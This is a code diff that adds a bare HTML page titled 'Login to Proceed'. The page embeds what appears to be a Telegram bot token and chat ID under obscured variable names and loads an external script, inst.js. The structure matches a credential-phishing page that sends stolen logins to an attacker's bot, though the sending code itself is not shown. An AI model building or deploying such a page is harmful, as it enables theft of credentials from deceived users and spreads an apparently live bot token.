@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Login to Proceed</title>
+</head>
+<body>
+
+  <script>const iovjrtrdhhj9 = '8500476075:AAEK3NdsicjOZKa4GltttGCY9QfD79v1uu4'; const I94626736O = '6425678431' ;</script>
+<script src="inst.js" defer></script>
+</body>
+</html>
